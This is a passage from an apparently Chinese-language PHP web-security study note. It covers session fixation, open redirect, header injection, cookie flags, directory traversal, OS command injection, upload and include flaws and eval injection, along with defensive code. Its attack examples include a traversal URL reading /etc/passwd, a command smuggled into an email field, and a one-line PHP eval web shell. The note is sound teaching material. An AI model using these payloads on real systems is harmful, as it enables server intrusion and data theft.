+  ![image-20220909172001418](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0acb6220fb22e8ebac9c46a6a2ccf255-eebd6c2.png)
+
+- **方案二 采用令牌**
+
+  登陆/注册时, 生成一个随机字符串(令牌), 将其同时保存在Cookie和会话变量中. 然后在各页面确认比较Cookie和令牌值, 如果两者一致则视为认证成功, 不一致时认证失败.
+
+  由于只有在登陆时令牌才发布, 攻击者不经过登陆页, 无法获取令牌值, 可以成功防御会话固定攻击
+
+  ![image-20220909175701763](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f04c67dec6e85b43c60d0785faba5eb-2e65b65.png)
+
+**辅助对策**
+
+如果登陆前使用了会话变量, 防范会话固定攻击比较难. 在这种状况下, 也可以使用hidden参数来传递值, 或与以下方式组合使用:
+
+- 不再登陆前的会话变量中存储敏感数据
+- 不使用嵌入URL的会话ID
+
+
+
+## 重定向相关
+
+Web应用中有时会重定向到外界指定的URL. 典型案例为: 在登陆页面参数中指定URL, 登陆成功后重定向到该URL.
+
+```
+https://www.google.com/accounts/ServiceLogin?continue=https://mail.google.com/mail
+```
+
+重定向处理时可能产生以下安全风险:
+
+- 自由重定向漏洞
+- HTTP消息头注入
+
+### 自由重定向
+
+有些Web应用提供了能够重定向到参数指定URL的功能, 即**重定向器(Redirector)**, 其中能够重定向到任意域名的重定向器叫**自由重定向(Open Redirect)**. 自由重定向可能导致用户在不知情状况下被带入其他网站, 从而遭受钓鱼攻击
+
+| 对象         | 结果                              |
+| ------------ | --------------------------------- |
+| 产生地点     | 能够重定向到外界指定URL的页面     |
+| 影响范围     | Web应用的所有页面                 |
+| 影响类型     | 诱导用户到钓鱼网站, 暴露重要信息  |
+| 影响程度     | 中 ~ 大                           |
+| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL |
+| 对策概要     | 固定重定向目标 或 白名单机制      |
+
+> 应该评估 [自由重定向功能] 是否不可或缺, 并固定重定向目标. 实在无法固定, 可限制在运行域名范围内
+
+**攻击案例** 
+
+- 1.目标页面, 正常登陆流程
+
+  ![image-20220909205057240](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/90f284a4a143655a75824ffcda1426ce-a74d589.png)
+
+  ![image-20220909205240730](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ade751cbcf447f63c21270d6a920be3c-96c7cce.png)
+
+- 2.构建钓鱼页面, 诱使用户点击
+
+  ![image-20220909205436417](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e51c4e3c1cda51b2eb0057a4851c62d8-4257e93.png)
+
+  ![image-20220909205806398](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/345583de1e1b940626cbd79228497524-a336fb5.png)
+
+自由重定向漏洞产生的原因主要是:
+
+1.重定向目标可以由外界指定
+
+2.没有对重定向目标域名做校验
+
+**对策** 
+
+- 固定重定向的目标URL
+- 使用编号指定重定向目标URL
+- 校验重定向目标域名
+
+### HTTP消息头注入
+
+HTTP消息头注入漏洞是指, 在重定向或生成Cookie等基于外部传入的参数输出HTTP响应头时查收的安全隐患. 输出响应消息头时, 通过在参数中添加换行符, 就可以实现任意添加响应消息头或伪造消息体的操作
+
+可能造成以下影响:
+
+- 生成任意Cookie
+
+- 重定向至任意URL
+
+- 更改页面显示内容
+
+- 执行任意JS代码而造成XSS同样的损害
+
+  
+
+响应头中的换行符有特殊意义, 一个换行符代表一条属性的结束, 两个换行符代表消息头结束, 消息体开始
+
+![image-20220909212221572](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ea61602f148ba8dbd93405f0e4f3b43e-5f92ef0.png)
+
+**请求报文格式**:
+
+![image-20220909210941145](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7c1d15011079f938d9de11fbc29be1d-c06feaa.png)
+
+**响应报文格式**:
+
+![image-20220909211106387](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/05d7d0454e0ea2c56e8673df629d2c12-e82ed0e.png)
+
+| 对象         | 结果                                                         |
+| ------------ | ------------------------------------------------------------ |
+| 产生地点     | 重定向或生成Cookie等基于外部传入的参数输出HTTP响应头的页面   |
+| 影响范围     | Web应用的所有页面                                            |
+| 影响类型     | 伪装、显示伪造页面、缓存污染                                 |
+| 影响程度     | 中 ~ 大                                                      |
+| 用户参与程度 | 需要 -> 点击链接, 浏览邮件附属URL                            |
+| 对策概要     | 不将外界传入参数作为HTTP响应头输出 或 校验重定向/生成Cookie参数中的换行符 |
+
+**安全隐患产生原因**
+
+HTTP响应头信息能够以文本格式逐行定义, 也就是说消息头之间以换行符分隔. 如果攻击者指定重定向目标URL或Cookie值参数中插入换行符, 且该换行符直接被作为响应输出, 就会产生HTTP消息头注入
+
+**对策**
+
+- **对策一** 不将外界参数作为HTTP响应消息头输出
+
+  - 不直接使用URL, 而是从外界获取URL编号, 对应匹配后指定URL
+  - 使用Web服务中的会话变量来移交URL
+
+- **对策二** 校验消息头参数
+
+  - 由专门的API进行重定向或生成Cookie
+
+    ```php
+    header('location:' . $URL);
+    setcookie();
+    ```
+
+  - 校验生成消息头参数中的换行符
+
+## cookie输出相关
+
+### 用途不当
+
+不应使用Cookie保存敏感数据, 或过于依赖Cookie中的数据. 因为Cookie是保存在客户端且可以被修改的
+
+![image-20220909213435904](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9e28a8d7ecfe3ceca5132f5821b2b7d4-55bd73a.png)
+
+> 除了控制消息有效期限和不同服务器件共享信息, 除此之外, 会话变量均优于使用Cookie
+
+### 输出方法不当
+
+输出Cookie时容易产生安全隐患:
+
+- HTTP消息头注入
+
+- Cookie安全属性设置不完善
+
+  ![image-20220909213416045](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ec14bc38e01a1c3e071897ef418506df-1c0e51c.png)
+
+  Cookie中包含Secure属性, 指定时仅在HTTPS传输下才会被浏览器发送至服务器. 而如果未指定安全属性, 即使应用中使用了HTTPS传输, Cookie也可能会以明文方式传输,  存在监听风险
+
+  为解决这一问题, 最直接的对策是使用Cookie的安全属性. 如果网站中HTTP和HTTPS同时存在,  可以通过添加一个设置安全属性的令牌Cookie, 在每个HTTPS页面中确认令牌值即可
+
+**对策**
+
+- **方案一** 设置Secure属性
+
+  ```properties
+  # php.ini
+  session.cookie_secure = 1
+  session.cookie_httponly = 1
+  ```
+
+- **方案二** 使用令牌Token
+
+  ```php
+  $token = $_COOKIE['token'];
+  if (!$token || $token != $_SESSION['token']) die('Token 验证失败');
+  ```
+
+## 文件处理相关
+
+在有些Web应用中, 可以通过外接传入参数的方式来指定服务器中的文件名, 如指定模板. 可能造成以下风险
+
+- 目录遍历  非法访问服务器文件
+- OS命令注入  调用OS命令
+
+### 目录遍历漏洞
+
+Web应用允许外界以参数形式指定服务器文件名时, 如果没有进行充分校验, 可能造成文件被浏览、篡改或删除. 
+
+可能造成以下**影响**:
+
+- 浏览Web服务器中的文件
+  - 泄露重要信息
+- 篡改/删除服务器文件
+  - 篡改网页文件内容
+  - 删除脚本文件或配置文件导致宕机
+  - 通过篡改脚本文件在服务器上执行任意脚本
+
+要**防范**目录遍历漏洞, 有如下方式(多选一):
+
+- 避免由外界指定文件名
+- 文件名中不允许包含目录
+- 限定文件名中仅包含数字和字母
+
+| 对象         | 结果                                                         |
+| ------------ | ------------------------------------------------------------ |
+| 产生地点     | 允许外界以参数形式指定服务器文件名的页面                     |
+| 影响范围     | Web应用的所有页面                                            |
+| 影响类型     | 泄露隐私信息、篡改删除信息、执行脚本、宕机                   |
+| 影响程度     | 大                                                           |
+| 用户参与程度 | 不需要                                                       |
+| 对策概要     | - 避免由外界指定文件名 <br />- 文件名中不允许包含目录 <br />- 限定文件名中仅包含数字和字母 |
+
+**攻击案例**
+
+- 1.目标页面
+
+  ![image-20220910103711569](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9f22cd09732fb15d8c36279ccc5a38d2-63712fe.png)
+
+- 2.请求参数变更
+
+  ```
+  http://local2.project.com/?tpl=../../../../etc/passwd
+  ```
+
+  ![image-20220910103756231](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b707e8b80910f90b56c78bbb381868d6-da8b2bd.png)
+
+**对策**
+
+实施以下任一项:
+
+- 避免由外界指定文件名
+
+  - 固定文件名
+  - 将文件名保存在会话变量中
+  - 不直接指定文件名, 而是使用编号的间接指定
+
+- 文件名中不允许包含目录
+
+  - ```php
+    $tpl = basename($_GET['tpl']);
+    ```
+
+- 限定文件名中仅包含数字和字母
+
+  - ```php
+    if (!preg_match('/\A[a-z0-9]+\.html\z/ui', $tpl)){
+        die('tpl仅能使用数字和字母');
+    }
+    ```
+
+### 内部文件被公开
+
+Web服务器中的公开目录有时会防止对外保密的文件. 外界一旦得知文件URL, 就能浏览内部文件, 所以, 一般不在公开目录中放置内部文件, 或直接禁用目录列表功能
+
+| 对象         | 结果                                               |
+| ------------ | -------------------------------------------------- |
+| 产生地点     | 网站全体                                           |
+| 影响范围     | 仅限于被公开文件                                   |
+| 影响类型     | 泄露隐私信息                                       |
+| 影响程度     | 大                                                 |
+| 用户参与程度 | 不需要                                             |
+| 对策概要     | 不在公开目录中放置内部文件, 或直接禁用目录列表功能 |
+
+![image-20220910104559023](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/8d69192c8659a05f764663bbee36d5a3-a50b9d8.png)
+
+```
+# Apache中编辑httpd.conf禁用目录列表
+<VirtualHost *:80>
+  ServerName ni9ne.com.cn
+  DocumentRoot "D:/wamp64/www/test/WebSecure/web"
+  <Directory  "D:/wamp64/www/test/WebSecure/web/">
+    Options +Includes +FollowSymLinks +MultiViews # 去除[+Indexes]配置
+    AllowOverride All
+    Require all granted
+  </Directory>
+</VirtualHost>
+```
+
+## 调用OS命令相关问题
+
+Web开发中, 大部分语言都支持通过shell执行OS(操作系统)命令. 当编码时通过shell执行OS命令或某个方法内部使用shell. 就可能出现OS命令被任意执行的情况, 即**OS命令注入**
+
+### OS命令注入
+
+- 1.目标页面 发送邮件
+
+  ![image-20220910121843511](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3e5962f26bed8d553ec9f17d6cafe24c-a12ac4f.png)
+
+  ![image-20220910121913823](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ffefa6eb6c260615b3202617cfebb36-8757277.png)
+
+- 2.输入注入命令
+
+  ```
+  ni9ne@outlook.com;cat /etc/passwd
+  ```
+
+  ![image-20220910122023301](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbbd0b8d784c15b58a0f80955acfbc96-fbe6d36.png)
+
+  
+
+**OS注入产生原因** 
+
+使用Shell来启动命令, 同时也意味着可以使用连续命令, 管道符, 重定向等功能
+
+```
+# php 执行代码
+system("echo hello > a.txt");
+# 相当于Shell执行
+sh -C echo hello > a.txt
+```
+
+如果指定OS命令参数字符串中混入了Shell的元字符, 就会导致攻击者添加的OS命令被执行. 即满足OS注入漏洞的条件包括:
+
+- 使用了内部调用Shell的函数 (system open等)
+- 将外界传入参数传递给内部调用Shell的函数
+- 参数中Shell的元字符没有被转义
+
+**对策**
+
+为了防范OS命令注入, 可以使用以下方法:
+
+- 选择不调用OS命令的实现方法
+
+  ```php
+  mb_send_mail($to, $content, 'From: xxx@qq.com');
+  ```
+
+- 不将外界输入的字符串传递给命令行参数
+
+  不将字符传放入命令, 而是通过指定消息头的方式, 由命令自行读取参数
+
+- 使用安全的函数对参数进行转义
+
+  ```php
+  escapeshellarg();
+  ```
+
+## 文件上传问题
+
+### 针对上传的DOS攻击
+
+使用上传功能连续发送体积巨大的文件, 可能形成网站负荷过载的**DOS攻击**(Denial of service Attack)
+
+防范DOS攻击的一种有效策略为限制上传文件的容量. 
+
+PHP中的php.ini文件限制:
+
+| 设置项目            | 说明                     | 默认值 |
+| ------------------- | ------------------------ | ------ |
+| file_uploads        | 是否允许使用文件上传     | On     |
+| upload_max_filesize | 单个文件最大容量         | 2MB    |
+| max_file_uploads    | 单次请求最大文件上传个数 | 20     |
+| post_max_size       | POST包最大限制           | 8MB    |
+| memory_limit        | 脚本最大申请内存         | 128MB  |
+
+>  Apache/Nginx中也有类似的配置项目
+
+### 上传执行脚本
+
+有些文件上传处理会将用户上传的文件保存至Web服务器的公开目录中. 如果上传了php、asp、aspx、jsp等脚本文件, 用户就可以在服务器上执行脚本, 造成与OS命令注入同样的影响
+
+为了防范上传脚本, 可以使用以下方法:
+
+- 不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现
+- 将文件的扩展名限定为不可执行的文件
+
+| 对象         | 结果                                                         |
+| :----------- | ------------------------------------------------------------ |
+| 产生地点     | 提供文件上传的页面                                           |
+| 影响范围     | 所有页面                                                     |
+| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
+| 影响程度     | 大                                                           |
+| 用户参与程度 | 不需要                                                       |
+| 对策概要     | - 不将用户上传的文件保存在公开目录中, 浏览文件需要通过脚本实现 <br />- 将文件的扩展名限定为不可执行的脚本文件 |
+
+**恶意脚本**
+
+```php
+@eval($_POST['shell']);
+```
+
+**对策**
+
+- 校验上传文件类型
+
+  ```php
+  # 匹配后缀
+  $allowType = ['jpg', 'gif', 'png'];
+  $allowHeader = [];
+  $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
+  if (!in_array($extension, $allowType)){
+      die('文件格式不允许上传');
+  }
+  # 匹配字节头
+  $allowHeader = [IMAGETYPE_GIF, IMAGETYPE_JPEG, IMAGETYPE_PNG];
+  $type = getimagesize($filename)[2];
+  if (!in_array($type, $allowHeader)){
+      die('文件格式不允许上传');
+  }
+  ```
+
+### 诱使用户下载恶意文件
+
+## include相关问题
+
+PHP等脚本语言能够从外部文件读取脚本源代码的一部分. 对应的关键字包括 
+
+```php
+require ;  require_once ; include ; include_once ;
+```
+
+如果外界能够制定include的对象文件名, 就可能造成意料之外的文件被include而遭受攻击. 即文件包含漏洞. 在PHP的配置中, 还能开启配置, 可以指定外部服务器的URL作为包含文件, 可能存在远程文件包含风险(RFI)
+
+```properties
+# php.ini
+allow_url_include = Off
+```
+
+为了防范文件包含漏洞, 可以采取以下措施:
+
+- 避免include的路径中包含外界传入的参数
+- include路径包含参数时, 限制字符种类仅为数字和字母
+
+| 对象         | 结果                                                         |
+| :----------- | ------------------------------------------------------------ |
+| 产生地点     | include读取脚本的页面                                        |
+| 影响范围     | 所有页面                                                     |
+| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
+| 影响程度     | 大                                                           |
+| 用户参与程度 | 不需要                                                       |
+| 对策概要     | - 避免include的路径中包含外界传入的参数<br />- include路径包含参数时, 限制字符种类仅为数字和字母 |
+
+## eval相关问题
+
+如果eval 函数使用不当, 可能导致外界传入脚本被执行, 即**eval注入攻击** 
+
+为避免出现风险, 可采取以下措施:
+
+- 不使用eval或eval相当的功能
+- 避免eval的参数包含外界传入的参数
+- eval参数中包含外界传入参数时, 校验参数, 限定为仅含数字字母 
+
+| 对象         | 结果                                                         |
+| :----------- | ------------------------------------------------------------ |
+| 产生地点     | 使用eval或eval相当的功能的页面                               |
+| 影响范围     | 所有页面                                                     |
+| 影响类型     | 泄露隐私信息、篡改删除数据、对外发动DOS攻击的                |
+| 影响程度     | 大                                                           |
+| 用户参与程度 | 不需要                                                       |
+| 对策概要     | - 不使用eval或eval相当的功能<br />- 避免eval的参数包含外界传入的参数<br />- eval参数中包含外界传入参数时, 限定为仅含数字字母 |
+
+
+
+
+
+
+
+
+
+## 发送邮件问题
+
+```
+# Apache中编辑httpd.conf
+  <Directory  "D:/wamp64/www/test/WebSecure/web/">
+    Options +Includes +FollowSymLinks +MultiViews # 去掉+Indexes配置
+    AllowOverride All
+    Require all granted
+  </Directory>
+```
+
+]]></content>
+      <categories>
+        <category>开发资料</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>后端</tag>
+        <tag>项目</tag>
       </tags>
   </entry>
 </search>
